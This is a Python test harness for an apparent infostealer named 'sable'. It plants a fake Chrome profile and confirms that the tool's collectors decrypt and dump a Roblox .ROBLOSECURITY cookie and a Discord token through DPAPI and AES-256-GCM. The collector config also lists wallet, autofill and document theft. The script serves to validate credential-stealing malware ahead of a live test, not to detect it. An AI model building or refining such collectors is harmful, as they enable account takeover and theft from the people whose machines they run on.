"""Prove both session collectors against one fixture, on this machine, in-process.

Two tokens, two stores, two decryption paths: ``.ROBLOSECURITY`` from the cookie
database through DPAPI + AES-256-GCM with the ``SHA256(host_key)`` binding, and the
Discord token from ``Local Storage\\leveldb`` through DPAPI + AES-256-GCM with no
binding. Both files come out of the same run, which is what the live test asserts.

    python session_probe.py

``LOCALAPPDATA``, ``APPDATA`` and ``USERPROFILE`` are pointed at a scratch tree first,
so the collectors cannot see this desktop's browsers. That is the isolation the VM
gives; what it does not give is a different machine.
"""

from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent / "sable"))

import sable_fixture as fixture  # noqa: E402


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="sable-session-probe-") as scratch:
        root = Path(scratch)
        local = root / "local"
        local.mkdir()

        profile = fixture.build(local / "Google" / "Chrome")
        fixture.roblox_cookie(profile)
        fixture.discord_token(profile)

        os.environ["LOCALAPPDATA"] = str(local)
        os.environ["APPDATA"] = str(root / "roaming")
        os.environ["USERPROFILE"] = str(root / "home")
        for name in ("APPDATA", "USERPROFILE"):
            Path(os.environ[name]).mkdir(parents=True, exist_ok=True)

        from agent import sources

        class _Cfg:
            class sources:  # noqa: N801 - the collector only reads attributes
                system = False
                browsers = True
                sessions = True
                wallets = False
                autofill = False
                documents = False

        out = root / "out"
        out.mkdir()
        counts, failures = sources.run_all(out, _Cfg())
        print(f"counts   {counts}")
        print(f"failures {failures or '{}'}")

        roblox = out / "roblox_session.txt"
        discord = out / "discord_session.txt"

        rob = roblox.read_text(encoding="utf-8").split() if roblox.is_file() else []
        dis = discord.read_text(encoding="utf-8").split() if discord.is_file() else []

        checks = [
            ("roblox_session.txt present", roblox.is_file()),
            ("roblox one line", len(rob) == 1),
            ("roblox exact", bool(rob) and rob[0] == fixture.STORE_TOKEN),
            ("discord_session.txt present", discord.is_file()),
            ("discord exact", bool(dis) and fixture.DISCORD_TOKEN in dis),
        ]

        print(f"\nroblox   {len(rob)} line(s), {len(rob[0]) if rob else 0} chars")
        print(f"discord  {len(dis)} line(s), {[len(v) for v in dis]}")
        print()
        for label, ok in checks:
            print(f"{'PASS' if ok else 'FAIL'}  {label}")
        return 0 if all(ok for _, ok in checks) else 1


if __name__ == "__main__":
    raise SystemExit(main())
